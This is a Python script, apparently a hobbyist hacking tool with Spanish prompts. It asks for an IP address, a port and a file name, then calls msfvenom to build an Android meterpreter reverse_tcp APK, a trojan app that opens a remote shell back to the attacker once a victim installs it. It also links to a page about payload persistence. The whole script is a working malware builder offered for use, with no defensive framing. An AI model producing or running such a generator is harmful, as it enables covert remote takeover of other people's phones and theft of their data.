# Desarrollado Por NesAnTime, Todos los derechos Reservados
from tqdm import tqdm
import os
import subprocess
import platform
import time
import webbrowser
from colorama import init, Fore, Style
init(autoreset=True)

def clear():
    sistema = platform.system()
    if sistema == "Windows":
        os.system("cls")
    elif sistema == "Linux":
        subprocess.run(["clear"])
    else:
        print("Este Sistema No Posee Mas Soporte")
def reverse(seg):
    time.sleep(seg)
def Barra(desc):
    lista_de_elementos = range(10)
    for elemento in tqdm(lista_de_elementos, desc):
        time.sleep(0.1)
def Comand(shell):
    try:
        subprocess.run(shell, shell=True, check=True, capture_output=True, text=True)
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[!] Error Al Ejecutar Comandos :( {e}")
        input(Fore.YELLOW + "\nPresione Enter Para Finalizar... ")
        webbrowser.open("https://nesantimeproyect.blogspot.com/p/errores-comunes-sysnes.html")
#-----------------------------------------------------------------------------

clear()
print(Fore.BLUE + "A Continuacion, Se Completara La Creacion De La Apk (reverb shell atraves tcp)\n")

direccionIP = input(f"{Fore.RED}[SYS-Create APK]{Fore.RESET + Fore.MAGENTA} --{Fore.RESET} Ingrese Su Direccion IP: ")
opc = input(f"{Fore.RED}[SYS-Create APK] {Fore.RESET + Fore.MAGENTA}- [!] {Fore.RESET}La Direccion IP {Fore.CYAN + direccionIP + Fore.RESET}, Ingresada ¿Es Correcta? (y/n): ")
while (opc == "n"):
    direccionIP = input(f"{Fore.RED}[SYS-Create APK] {Fore.RESET + Fore.MAGENTA}- [!] {Fore.RESET}Ingrese Nuevamente Su Direccion IP: ")
    opc = input(f"{Fore.RED}[SYS-Create APK] {Fore.RESET + Fore.MAGENTA}- [!] {Fore.RESET}La Direccion IP {Fore.CYAN + direccionIP + Fore.RESET}, Ingresada ¿Es Correcta? (y/n): ")

print(Fore.GREEN + f"[!] Se Ha Establecido Tu Direccion IP ({direccionIP}), ¡Correctamente!")
reverse(seg=1.5)

clear()
print(Fore.BLUE + "A Continuacion, Se Completara La Creacion De La Apk (reverb shell atraves tcp)\n")
port = int(input(f"{Fore.RED}[SYS-Create APK]{Fore.RESET + Fore.MAGENTA} --{Fore.RESET} Proporcione un Puerto de Escucha: "))
print(Fore.GREEN + f"[!] El Puerto de Escucha ({str(port)}) Se ha Establecido Correctamente..\n")
reverse(seg=1.5)


clear()
print(Fore.BLUE + "*** Terminando La Creacion del APK ;) *** ")
name = input(f"\n{Fore.RED}[SYS-Create APK]{Fore.RESET + Fore.MAGENTA} --{Fore.RESET} Ingrese un Nombre para el archivo: ")
reverse(seg=1)
print(Fore.GREEN + "[!] Se Ha establecido El Nombre del Archivo ¡Correctamente! ")
reverse(seg=1)
clear()
print(Fore.GREEN + Style.DIM + f"[!] Creando Archivos De {name}.apk")
reverse(seg=1)
print(Fore.GREEN + "[!] Creando Logica Meterpreter...")
reverse(seg=1)
Barra(desc="Comprimiendo Archivos en el Apk")
clear()

#--------- Comandos Sudo APT ----------
Shell = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={direccionIP} LPORT={str(port)} -o APKs/{name}.apk"
Shell2 = f"mkdir APKs"
Comand(Shell2)
Comand(Shell)

print(Fore.CYAN + "\n ---------- Se Ha Creado El Archivo .APK Correctamente ---------- \n")
print(Fore.CYAN + Style.DIM + "***______ Informacion Y Detalles ______***")
print(f"{Fore.RED}Nombre: {Fore.RESET + name}.apk")
print(f"{Fore.RED}IP: {Fore.RESET + direccionIP}")
print(f"{Fore.RED}PORT: {Fore.RESET + str(port)}")
print(f"{Fore.RED + Style.BRIGHT}RUTA DEL APK: {Fore.RESET} APKs/{name}.apk")
info = input(f"\n {Fore.YELLOW}[SYS-Create APK] - [!] {Fore.RESET}Para mas Informacion, Escriba (info): ")
if info == "info":
    webbrowser.open("https://nesantimeproyect.blogspot.com/p/funcion-de-persistencia-en-un-payload.html")
else:
    reverse(seg=0.5)
